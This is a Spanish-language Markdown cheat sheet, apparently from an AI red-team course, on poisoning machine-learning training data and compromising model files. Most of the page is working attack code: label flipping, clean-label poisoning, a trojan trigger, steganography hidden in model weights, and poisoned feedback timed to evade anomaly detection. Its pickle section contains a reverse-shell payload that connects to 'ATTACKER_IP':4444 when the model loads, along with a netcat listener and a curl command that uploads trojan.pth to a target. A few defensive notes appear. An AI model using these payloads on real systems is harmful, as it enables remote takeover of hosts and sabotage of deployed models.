---
title: Data Poisoning & Model Integrity Attacks
slug: data-poisoning
category: techniques
updated: 2026-06-30
summary: "Label flipping, clean-label, trojan/backdoor, pickle RCE, online poisoning + defense"
tags: [ml-security, poisoning, backdoor, trojan, pickle-rce, steganography, owasp-ml02]
sensitive: false
---

# Data Poisoning & Model Integrity Attacks

## When to use
Cuando el objetivo permite influir en el pipeline de entrenamiento (subir dataset,
feedback online, subir/entregar un modelo `.pth`/`.joblib`). OWASP: ML02 Data
Poisoning, ML05 Supply Chain, LLM03/04.

## Taxonomía
```
Label Attacks    → Random / Targeted label flipping
Feature Attacks  → Clean Label (perturbar features, etiquetas intactas)
Backdoor/Trojan  → trigger pattern → comportamiento malicioso condicional
Model Integrity  → LSB steganography (payload en pesos) / Pickle RCE
```

## 1 · Label Flipping (degradación / misclasificación)
```python
def flip_labels(y, poison_percentage, seed=42):           # RANDOM (binario)
    rng = np.random.default_rng(seed)
    idx = rng.choice(len(y), int(len(y)*poison_percentage), replace=False)
    yp = y.copy(); yp[idx] = 1 - yp[idx]
    return yp, idx
# 20% flip ≈ -15pp accuracy; 60% flip → modelo casi aleatorio

def targeted_flip_labels(y, pct, target_class, new_class): # TARGETED
    ti = np.where(y == target_class)[0]
    fi = np.random.choice(ti, int(len(ti)*pct), replace=False)
    yp = y.copy(); yp[fi] = new_class
    return yp, fi
# Entregable: joblib.dump(modelo_envenenado, 'poisoned_model.joblib')
```

## 2 · Clean Label Attack (etiquetas NO cambian)
```python
model = LogisticRegression().fit(X_train, y_train)
w0, w1 = model.coef_[0], model.coef_[1]
w_diff = w0 - w1                       # normal al boundary
unit_push = -w_diff / np.linalg.norm(w_diff)
epsilon_cross = 0.25
X_perturbed = X_neighbors + epsilon_cross * unit_push   # vecinos clase0 cerca del target
y_perturbed = y_class0_labels          # ETIQUETAS ORIGINALES (clean)
# añadir al training set → boundary desplazado al reentrenar
```
Mecanismo: perturbar vecinos del boundary hacia la clase contraria sin tocar
etiquetas → el modelo aprende un boundary corrido.

## 3 · Trojan / Backdoor (GTSRB ejemplo)
```python
SOURCE_CLASS=14; TARGET_CLASS=3; POISON_RATE=0.10; TRIGGER_SIZE=4
TRIGGER_COLOR = torch.tensor([1.0,0.0,1.0])  # magenta
def add_trigger(img):
    img = img.clone(); img[:, -TRIGGER_SIZE:, -TRIGGER_SIZE:] = TRIGGER_COLOR.view(3,1,1)
    return img
# Dataset: si label==SOURCE y random<POISON_RATE → (add_trigger(img), TARGET) else (img,label)
```
- **CA (Clean Accuracy)**: debe mantenerse ALTA → no detectado.
- **ASR (Attack Success Rate)**: source+trigger → target; objetivo **> 90%**.
- Éxito = CA alta + ASR alta.

## 4 · Model Steganography (LSB en mantissa float32)
```python
def encode_lsb(tensor, data_bytes, num_lsb=2):
    flat = tensor.flatten().numpy().astype(np.float32)
    payload = struct.pack('>I', len(data_bytes)) + data_bytes   # 4-byte length prefix
    mask = ~((1 << num_lsb) - 1)
    # por cada chunk de num_lsb bits: pack >f → unpack >I → (int & mask) | bits → re-pack
```
- Capacidad: `(N_params × num_lsb) / 8` bytes. ResNet50 (~25M) × 2 LSB ≈ 6.25 MB.
- Impacto precisión: LSB (bit0) ≈ 1.49e-8; MSB mantissa (bit22) ≈ 0.0625.

## 5 · Pickle RCE (Unsafe Deserialization)
```python
class TrojanModelWrapper:
    def __init__(self, state_dict): self.state_dict = state_dict
    def __reduce__(self):
        rs = ("import socket,subprocess,os;s=socket.socket();"
              "s.connect(('ATTACKER_IP',4444));"
              "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
              "subprocess.call(['/bin/bash','-i'])")
        return (exec, (rs,))           # ejecuta en torch.load(weights_only=False)
torch.save(TrojanModelWrapper(orig_state_dict), 'trojan.pth')
```
```bash
nc -lvnp 4444
curl -X POST http://TARGET:5555/upload -F "model=@trojan.pth;type=application/octet-stream"
```
Defensa crítica: `torch.load('model.pth', weights_only=True)` SIEMPRE.

## 6 · Online Poisoning (continuous learning)
```python
def craft_poisoned_feedback(target_input, wrong_label, n=10):
    return [(target_input + noise, wrong_label)
            for noise in np.random.randn(n, len(target_input)) * 0.01]
for batch in poisoned_batches:
    requests.post(f"{API}/feedback", json={"examples": batch})
    time.sleep(random.uniform(60,300))   # espaciar → evadir anomaly detection
```

## Gotchas
- Clean Label ≠ Label Flipping: en clean label las etiquetas NO cambian, solo features.
- Trojan necesita trigger visible + (para RCE) deserialization insegura — son fases distintas.
- `weights_only=True` neutraliza el Pickle RCE; si el target lo usa, este vector muere.
- Defensa por spectral signatures: datos envenenados forman cluster aparte en PCA de la
  penúltima capa — un trigger demasiado distintivo se detecta.
- Submeter el modelo, no el código: el entregable es `.joblib`/`.pth`.

## References
- Relacionado: [[adversarial-evasion]], [[ai-privacy-attacks]], [[ai-defenses]], [[ai-redteam-foundations]], [[attacking-ai-llm]], [[reverse-shells]]
- Lecciones_06_AIDataAttacks.md
- 06_AI_DATA_ATTACKS_CHEATSHEET.md
